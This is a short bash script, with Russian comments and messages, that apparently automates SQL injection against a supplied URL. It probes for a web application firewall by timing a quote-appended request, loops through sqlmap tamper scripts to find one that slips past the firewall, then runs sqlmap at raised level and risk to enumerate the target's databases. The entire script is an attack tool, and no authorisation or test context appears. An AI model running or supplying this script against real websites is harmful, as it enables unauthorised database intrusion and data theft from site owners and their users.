#!/bin/bash
TARGET=$1
[ -z "$TARGET" ] && echo "Usage: $0 http://target.com?id=1" && exit 1

echo "[SQLMAP-EVO] Проверяю наличие WAF..." 
NORMAL=$(curl -sk --max-time 5 "$TARGET" -o /dev/null -w '%{time_total}' 2>/dev/null)
SQLI=$(curl -sk --max-time 5 "${TARGET}'" -o /dev/null -w '%{time_total}' 2>/dev/null)
DIFF=$(python3 -c "print(abs($SQLI - $NORMAL) * 1000)")

if [ "${DIFF%.*}" -gt 100 ]; then
    echo "[SQLMAP-EVO] WAF обнаружен! Экспериментирую с тамперами..."
    # Пробуем каждый тампер отдельно и смотрим, какой даёт ответ 200
    for tamper in space2comment charencode randomcase between percentage charunicodeencode versionedmorekeywords; do
        CODE=$(sqlmap -u "$TARGET" --batch --tamper="$tamper" --delay=1 --timeout=10 2>/dev/null | grep -c "200 OK")
        if [ "$CODE" -gt 0 ]; then
            echo "  ✅ Работает: $tamper"
            BEST_TAMPER="$tamper"
            break
        fi
    done
    TAMPERS="${BEST_TAMPER:-space2comment,randomcase}"
else
    echo "[SQLMAP-EVO] WAF не найден. Стандартный запуск."
    TAMPERS="between,randomcase"
fi

echo "[SQLMAP-EVO] Запускаю с тамперами: $TAMPERS"
sqlmap -u "$TARGET" --batch --random-agent --tamper="$TAMPERS" --level=3 --risk=2 --dbs --output-dir="$HOME/argus_sqlmap_evo" 2>/dev/null
